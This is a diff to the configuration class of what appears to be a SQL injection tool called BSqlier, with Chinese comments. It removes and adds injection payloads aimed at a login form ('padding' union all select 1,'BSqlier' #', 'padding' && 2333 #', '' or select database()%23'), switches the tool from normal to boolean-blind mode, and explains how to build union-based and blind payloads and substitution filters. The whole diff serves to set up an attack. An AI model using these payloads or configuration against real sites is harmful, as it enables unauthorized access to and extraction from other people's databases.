@@ -59,27 +59,13 @@ class BaseConfig:
         )
         self.sqlirequest = SqliRequest[0]
 
-        '''
-        当传参方式为GET
-        payload传入为键值对方式
-        example: username=ddog123' && select database() && '1'='1&passwd=ddog123&submit=Log+In
-        '''
-        self.payload = "username=ddog123' && select database() && '1'='1&passwd=ddog123&submit=Log+In"
-
-        '''
-        当传参方式为POST
-        payload传入方式为字典
-        example: payload = {"username": "ddog' or select database()%23", "password": "a"}
-        self.payload = {"username": "ddog' or select database()%23", "password": "a"}
-        '''
-
         # 注入方式 0为正常 1为盲注 2为时间盲注
         SqliMethod = (
             "normal",
             "build",
             "time"
         )
-        self.sqlimethod = SqliMethod[0]
+        self.sqlimethod = SqliMethod[1]
 
         # 若注入方式为normal，你需要自定义解包函数, 提供两种方式，一种为find, 一种为bs4,解包函数在上面
 
@@ -102,7 +88,7 @@ class BaseConfig:
 
         而testmethod则是选择使用那种测试，互相兼容可以同时跑
         '''
-        self.wtest = False
+        self.wtest = True
 
         self.testmethod = {
             "test": 0,
@@ -160,8 +146,12 @@ class BaseConfig:
         从这里开始，要进入对于payload的配置了，首先需要对注入语句进行配置，然后注入语句通过自定义的替换表，之后构造注入语句为请求
         payload===>替换为指定payload===>自定义替换表===>请求===>开始注入
 
+        若为normal注入，必须构造返回BSqlier的payload，并通过test模式修改解包函数直至可以获取返回值（必须以空格为分隔符，结尾必须只有一个词（结尾可以通过修改自定义替换表中的值来修改））
+        eg: self.payload = "padding' union all select 1,'BSqlier' #"
+
+        若为build注入，则为与、或条件构造，如果是与注入，padding必须为返回值的条件
         '''
-        self.payload = "padding' union all select 1,'BSqlier' #"
+        self.payload = "padding' && 2333 #"
 
         '''
         配置请求,把请求中payload的位置设置为BSqlier（如果拼错了就会全部无效...）
@@ -170,13 +160,14 @@ class BaseConfig:
         '''
         self.requesetformat = "user=BSqlier&passwd=ddog123&submit=Log+In"
         # self.requesetformat = {"user": "BSqlier", "password": "a"}
+
         '''
         配置自定义替换表,合理的替换表配置远远可以替换出想要的所有情况payload
         '''
 
         self.filter = {
             'select': 'SELECT',
-            'padding': 'ddog'
+            'padding': 'user1'
         }
 
         '''
